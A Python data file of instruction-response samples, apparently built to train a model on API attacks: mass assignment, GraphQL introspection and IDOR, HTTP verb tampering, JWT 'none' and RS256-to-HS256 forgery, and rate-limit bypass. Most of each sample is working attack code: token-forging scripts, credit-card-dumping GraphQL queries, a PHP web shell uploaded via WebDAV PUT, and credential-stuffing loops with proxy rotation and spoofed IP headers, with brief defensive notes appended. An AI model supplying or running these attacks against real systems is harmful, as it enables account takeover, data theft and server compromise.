#!/usr/bin/env python3
"""
Modern API attack dataset:
mass assignment, GraphQL abuse, verb tampering,
JWT none algorithm, and API rate-limit bypass.
"""

from generate_dataset import Sample

API_ATTACK_SAMPLES = [
    # ── Mass Assignment ──────────────────────────────────────────
    Sample(
        instruction="Explain mass assignment vulnerabilities in REST APIs and how to exploit them for privilege escalation.",
        input="Target: Node.js/Express API using Mongoose ODM; user registration endpoint",
        output="""## Mass Assignment Vulnerability

Mass assignment occurs when a framework automatically binds user-supplied
parameters to model attributes without filtering, allowing attackers to
set fields that should not be user-controllable (e.g., `isAdmin`, `role`, `credits`).

### Vulnerable Code Pattern

```javascript
// Vulnerable: binds ALL body fields directly to User model
app.post('/register', async (req, res) => {
    const user = new User(req.body);   // req.body is directly assigned!
    await user.save();
    res.json({ id: user._id });
});

// User model has sensitive fields:
const UserSchema = new mongoose.Schema({
    username: String,
    password: String,
    email: String,
    role: { type: String, default: 'user' },    // ← should not be settable
    isAdmin: { type: Boolean, default: false },  // ← should not be settable
    credits: { type: Number, default: 0 }        // ← should not be settable
});
```

### Exploitation

**Privilege Escalation to Admin**:
```http
POST /register HTTP/1.1
Content-Type: application/json

{
    "username": "attacker",
    "password": "password123",
    "email": "attacker@evil.com",
    "isAdmin": true,
    "role": "admin",
    "credits": 99999
}
```

If the API accepts and stores `isAdmin: true`, the attacker has admin access.

### Discovery Methodology

1. **Read API Documentation / OpenAPI spec**:
   ```bash
   curl https://target.com/api/swagger.json | jq '.definitions.User'
   ```

2. **Compare registration vs. profile endpoint**:
   - `POST /register` → returns `{id, username, email}`
   - `GET /profile` → returns `{id, username, email, role, isAdmin, credits}`
   - The extra fields in GET response are candidates for mass assignment

3. **Fuzz with extra parameters**:
   ```python
   import requests, json

   extra_fields = {
       "role": "admin",
       "isAdmin": True,
       "is_admin": True,
       "admin": True,
       "permissions": ["admin"],
       "credits": 99999,
       "balance": 99999,
       "verified": True,
       "subscription": "premium",
   }

   base = {"username": "test1", "password": "pass123", "email": "t@t.com"}
   for field, value in extra_fields.items():
       payload = {**base, field: value, "username": f"test_{field}"}
       r = requests.post("https://target.com/register", json=payload)
       profile = requests.get("https://target.com/profile",
                              headers={"Authorization": f"Bearer {login(payload['username'])}"})
       if field in profile.json() and profile.json()[field] == value:
           print(f"[!] VULNERABLE: {field}={value} was accepted!")
   ```

### PUT/PATCH Update Escalation

Even if registration is protected, update endpoints may be vulnerable:
```http
PUT /api/users/me HTTP/1.1
Authorization: Bearer <user_token>
Content-Type: application/json

{
    "email": "newemail@test.com",
    "role": "admin"
}
```

### GraphQL Mass Assignment

```graphql
mutation {
    updateUser(input: {
        email: "new@test.com",
        role: "admin",        # ← try adding sensitive fields
        isVerified: true
    }) {
        id role isVerified
    }
}
```

### Defensive Countermeasure
- Use explicit field allowlists (whitelist approach):
  ```javascript
  const user = new User(_.pick(req.body, ['username', 'password', 'email']));
  ```
- Use DTO (Data Transfer Objects) with strict schema validation (Zod, Joi)
- Never auto-bind request body to ORM models directly
- Apply field-level permissions in GraphQL resolvers
""",
        category="api",
        subcategory="mass_assignment",
    ),

    # ── GraphQL Introspection & IDOR ─────────────────────────────
    Sample(
        instruction="How do you perform GraphQL reconnaissance using introspection and discover IDOR vulnerabilities?",
        input="Target: GraphQL API endpoint at /graphql; authentication via JWT",
        output="""## GraphQL Reconnaissance & IDOR Exploitation

GraphQL's introspection system reveals the entire API schema, enabling
attackers to discover hidden fields, mutations, and sensitive query paths.

### Step 1 — Check if Introspection is Enabled

```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'
# If returns {"data":{"__typename":"Query"}} → GraphQL confirmed
```

```graphql
# Full introspection query
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
  }
}
```

### Step 2 — Use GraphQL Voyager / InQL for Visual Schema

```bash
# InQL (Burp extension or CLI)
inql -t https://target.com/graphql

# Generates all possible queries and mutations
# Output: queries.txt, mutations.txt, schema.json
```

### Step 3 — Discover Sensitive Queries

From introspection, identify:
- `adminDashboard` / `allUsers` / `exportData` → privilege escalation paths
- Direct object references by ID: `user(id: Int)`, `order(id: Int)`
- Hidden fields: `user { id email password_hash ssn balance }`

### Step 4 — IDOR via Direct Object References

```graphql
# Your account
query {
  user(id: 42) {
    id email creditCard { number cvv }
  }
}

# Other users — iterate IDs
query {
  user(id: 1) { id email creditCard { number cvv } }
}
query {
  user(id: 2) { id email creditCard { number cvv } }
}
```

**Batch IDOR via aliases**:
```graphql
query BatchIDOR {
  u1: user(id: 1) { email creditCard { number } }
  u2: user(id: 2) { email creditCard { number } }
  u3: user(id: 3) { email creditCard { number } }
}
```

### Step 5 — Mutation Abuse

```graphql
# Unauthorized password reset
mutation {
  resetUserPassword(userId: 1, newPassword: "hacked123") {
    success
  }
}

# IDOR in file upload mutation — upload to another user's space
mutation {
  uploadFile(userId: 1, file: "malware.exe") {
    url
  }
}
```

### Step 6 — GraphQL Batching Attack (Rate Limit Bypass)

```json
[
  {"query": "mutation { login(user: \"admin\", pass: \"password1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password2\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password3\") { token } }"}
]
```
One HTTP request = many mutations → bypasses per-request rate limiting.

### Step 7 — Field Suggestion Abuse

When introspection is disabled, GraphQL may still suggest field names:
```graphql
{ user { passwor } }
# Error: "Did you mean 'password'?"
# → reveals field names through typo suggestions
```

Disable suggestions with: `apollo-server: { introspection: false, playground: false, debug: false }`

### Defensive Countermeasure
- Disable introspection in production
- Implement depth limiting (prevent deeply nested queries → DoS)
- Apply per-field authorization middleware
- Use persistent queries (allowlist of known query hashes)
- Rate limit by operation name, not just HTTP requests
""",
        category="api",
        subcategory="graphql_idor",
    ),

    # ── HTTP Verb Tampering ───────────────────────────────────────
    Sample(
        instruction="How does HTTP verb tampering bypass authentication and access controls?",
        input="Target: Java/Spring application; authentication filter configured for specific HTTP methods",
        output="""## HTTP Verb Tampering

Some access control frameworks restrict permissions by HTTP method.
By using unexpected methods (HEAD, OPTIONS, arbitrary custom methods),
attackers may bypass authentication or authorization checks.

### Scenario 1 — Spring Security Method-Based Bypass

**Vulnerable configuration**:
```java
// Only requires auth for GET and POST to /admin
http.authorizeRequests()
    .antMatchers(HttpMethod.GET, "/admin/**").authenticated()
    .antMatchers(HttpMethod.POST, "/admin/**").authenticated()
    .antMatchers("/public/**").permitAll();
// HEAD, PUT, DELETE, PATCH, OPTIONS to /admin/ → NOT restricted!
```

**Exploitation**:
```bash
# GET /admin → 401 Unauthorized
curl -X GET https://target.com/admin/users

# HEAD /admin → 200 OK (no auth required!)
curl -X HEAD https://target.com/admin/users

# Use TRACE to reflect request and view server-side headers
curl -X TRACE https://target.com/admin/users
```

### Scenario 2 — Override via HTTP Headers

Some servers honor method override headers, routing to different handlers:
```http
# Override POST as DELETE
POST /api/articles/42 HTTP/1.1
X-HTTP-Method-Override: DELETE
```

```http
# PHP frameworks (Symfony, Laravel)
POST /admin/user/1
_method=DELETE   (form body parameter)
```

```http
# Django, Rails
POST /users/1
X-HTTP-Method: PATCH
```

### Scenario 3 — OPTIONS Method Information Disclosure

```bash
curl -X OPTIONS https://target.com/api/admin -v
# Response: Allow: GET, POST, PUT, DELETE, PATCH
# Reveals all available methods → confirm attack surface
```

### Scenario 4 — WebDAV Method Abuse

Servers with WebDAV enabled expose additional methods:
```bash
# PROPFIND — directory listing
curl -X PROPFIND https://target.com/admin/ \
  -H "Depth: 1" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><propfind xmlns="DAV:"><allprop/></propfind>'

# MOVE — rename/move files
curl -X MOVE https://target.com/uploads/safe.jpg \
  -H "Destination: /var/www/html/shell.php"

# PUT — write arbitrary files
curl -X PUT https://target.com/uploads/shell.php \
  -H "Content-Type: text/plain" \
  -d '<?php system($_GET["cmd"]); ?>'
```

### Scenario 5 — Arbitrary Verb to Bypass WAF

```bash
# WAF only inspects GET and POST; BLAHBLAH method is passed through
curl -X BLAHBLAH https://target.com/search?q=<script>alert(1)</script>
```

### Testing Methodology

```python
import requests

methods = ['GET','POST','PUT','DELETE','PATCH','HEAD',
           'OPTIONS','TRACE','CONNECT','PROPFIND','MOVE','COPY',
           'FAKEMETHOD']

for method in methods:
    try:
        r = requests.request(method, "https://target.com/admin/users",
                             allow_redirects=False, timeout=5)
        print(f"{method:12} → {r.status_code}")
    except Exception as e:
        print(f"{method:12} → ERROR: {e}")
```

### Defensive Countermeasure
- Deny all HTTP methods by default, explicitly allowlist needed ones
- Apply auth at URL pattern level, not method level:
  ```java
  .antMatchers("/admin/**").authenticated()  // ← applies to ALL methods
  ```
- Disable WebDAV, TRACE, TRACK methods at web server level (Apache/nginx)
- Validate and ignore `X-HTTP-Method-Override` headers in security-sensitive contexts
""",
        category="api",
        subcategory="verb_tampering",
    ),

    # ── JWT Algorithm Confusion (none + RS256→HS256) ─────────────
    Sample(
        instruction="Demonstrate JWT 'none' algorithm and RS256-to-HS256 confusion attacks step by step.",
        input="Target: Node.js API using jsonwebtoken library; JWTs for session management",
        output="""## JWT Algorithm Confusion Attacks

Two classic JWT vulnerabilities that allow forging arbitrary tokens:
1. `alg: none` — server accepts unsigned tokens
2. RS256→HS256 confusion — server's public key used as HMAC secret

### Attack 1 — Algorithm "none"

Some libraries accept `alg: none` tokens with no signature.

**Normal JWT**:
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9.
<RSA_SIGNATURE>
```

**Forged token (alg:none)**:
```python
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Header with none algorithm
header = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())

# Payload with elevated privilege
payload = b64url(json.dumps({"user":"alice","role":"admin","iat":9999999999}).encode())

# No signature needed
token = f"{header}.{payload}."
print(token)
```

Use this token in `Authorization: Bearer <token>`.

**Variants to try**:
```
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

### Attack 2 — RS256 to HS256 Confusion

RS256: server signs with **private key**, verifies with **public key**.
HS256: server signs AND verifies with the **same secret key**.

**The attack**: Set `alg: HS256` and sign with the server's **public key**.
If the server confusingly uses the same key for HS256 verification, it accepts the token.

**Step 1 — Obtain the public key**:
```bash
# Common locations
curl https://target.com/.well-known/jwks.json
curl https://target.com/oauth/discovery
# Or extract from a valid JWT
python3 -c "
import jwt, base64, json
token = 'eyJ...<valid_token>...'
header = json.loads(base64.urlsafe_b64decode(token.split('.')[0] + '=='))
print(header)  # Look for 'kid' or 'x5c' fields
"
```

**Step 2 — Forge HS256 token signed with public key**:
```python
import jwt

# Public key in PEM format (obtained from JWKS endpoint)
public_key = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----'''

forged = jwt.encode(
    {"user": "alice", "role": "admin"},
    public_key,           # ← public key used as HMAC secret
    algorithm="HS256"     # ← algorithm changed to HS256
)
print(forged)
```

**Step 3 — Send and verify**:
```bash
curl -H "Authorization: Bearer <forged_token>" \
     https://target.com/api/admin/users
```

### Attack 3 — JWK Header Injection

Some servers resolve the signing key from the JWT header itself:
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "<attacker_modulus>"   ← inject attacker's own public key
  }
}
```

Sign the token with the matching attacker private key.
Server fetches the key from the header, trusts it → accepts forged token.

```python
# Generate attacker keypair
from Crypto.PublicKey import RSA
key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key()

# Build JWK from public key and embed in header
# ... (inject in alg header)
```

### Automated Tool

```bash
# jwt_tool.py — automated JWT attacks
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <token> -X a    # alg:none
python3 jwt_tool.py <token> -X s    # RS256→HS256
python3 jwt_tool.py <token> -X i    # JWK injection
```

### Defensive Countermeasure
- Explicitly specify accepted algorithms: `jwt.verify(token, key, { algorithms: ['RS256'] })`
- Never accept `none` algorithm
- Do not allow client-supplied `jwk`/`jku`/`x5u` headers
- Use asymmetric keys (RS256) and never expose private key
""",
        category="api",
        subcategory="jwt_confusion",
    ),

    # ── API Rate Limit Bypass ────────────────────────────────────
    Sample(
        instruction="What techniques bypass API rate limiting for brute-force and credential stuffing attacks?",
        input="Target: REST API with rate limit of 10 requests/minute per IP on /auth/login endpoint",
        output="""## API Rate Limit Bypass Techniques

Rate limits that rely solely on IP address or simple request counting
are bypassable through IP rotation, header manipulation, and
request distribution techniques.

### Bypass 1 — IP Rotation

```python
import requests
from itertools import cycle

# Free proxy list (use rotating residential proxies in practice)
proxies = [
    "http://1.2.3.4:8080",
    "http://5.6.7.8:8080",
    "http://9.10.11.12:8080",
]
proxy_pool = cycle(proxies)

credentials = [("admin", f"pass{i}") for i in range(1000)]

for username, password in credentials:
    proxy = {"http": next(proxy_pool), "https": next(proxy_pool)}
    r = requests.post("https://target.com/auth/login",
                      json={"username": username, "password": password},
                      proxies=proxy)
    if r.status_code == 200:
        print(f"[+] Valid: {username}:{password}")
```

### Bypass 2 — X-Forwarded-For Spoofing

If the backend trusts the `X-Forwarded-For` header for rate limiting:
```python
import requests, random

def random_ip():
    return ".".join(str(random.randint(1,254)) for _ in range(4))

for i, (user, pwd) in enumerate(credentials):
    r = requests.post(url, json={"username": user, "password": pwd},
                      headers={
                          "X-Forwarded-For": random_ip(),
                          "X-Real-IP": random_ip(),
                          "X-Client-IP": random_ip(),
                          "CF-Connecting-IP": random_ip(),
                          "True-Client-IP": random_ip(),
                      })
```

### Bypass 3 — Null Byte / Case Variation in Username

Rate limits keyed on exact username can be bypassed with equivalent variants:
```
admin        → rate limited after 10 attempts
admin%00     → different key in rate limiter
Admin        → different key (case-insensitive login but case-sensitive rate limit)
admin%20     → trailing space (trimmed on auth but not on rate limit key)
ａｄｍｉｎ   → Unicode fullwidth (normalizes to admin on auth)
```

### Bypass 4 — Distribute Across Endpoints

If multiple auth endpoints exist with independent rate limits:
```
POST /api/v1/login          ← 10 req/min
POST /api/v2/login          ← 10 req/min (separate counter)
POST /api/auth/signin       ← 10 req/min (separate counter)
POST /mobile/v1/auth        ← 10 req/min (separate counter)
= 40 req/min total for same account
```

### Bypass 5 — Race Condition (Parallel Requests)

Some rate limiters count after request processing, not before:
```python
import asyncio, aiohttp

async def login_attempt(session, password):
    async with session.post(url, json={"username":"admin","password":password}) as r:
        return r.status, await r.text()

async def burst(passwords):
    async with aiohttp.ClientSession() as session:
        tasks = [login_attempt(session, p) for p in passwords]
        return await asyncio.gather(*tasks)

# Send 50 requests simultaneously before rate limiter records any
results = asyncio.run(burst(password_list[:50]))
```

### Bypass 6 — Parameter Pollution to Reset Counter

```
# Rate limiter tracks POST /auth/login — 10 requests
POST /auth/login?reset=1     # Different URL → different rate limit bucket
POST /auth/login#fragment    # Fragment may create new bucket
```

### Bypass 7 — Account Enumeration via Timing

Even if login is rate-limited, enumerate valid accounts via time difference:
```python
import time, requests

usernames = ["admin", "user1", "nonexistent99999"]
for username in usernames:
    start = time.perf_counter()
    requests.post(url, json={"username": username, "password": "wrongpass"})
    elapsed = time.perf_counter() - start
    # Valid usernames trigger bcrypt hash comparison (~200ms)
    # Invalid usernames fail fast (~5ms)
    print(f"{username}: {elapsed*1000:.1f}ms")
```

### Detection: Identify Rate Limit Mechanism

```python
import requests

# Send 11 requests and analyze responses
for i in range(15):
    r = requests.post(url, json={"username":"test","password":"test"})
    print(f"Request {i+1}: {r.status_code} - {r.headers.get('X-RateLimit-Remaining','?')} remaining")
# Look for: Retry-After header, X-RateLimit-* headers, 429 status code
```

### Defensive Countermeasure
- Never trust client-supplied IP headers for rate limiting
- Use rate limits based on user account, not just IP
- Implement exponential backoff (not just flat limit)
- Deploy CAPTCHA after N failed attempts per account
- Use a WAF with bot detection (fingerprinting, JS challenge)
""",
        category="api",
        subcategory="rate_limit_bypass",
    ),
]
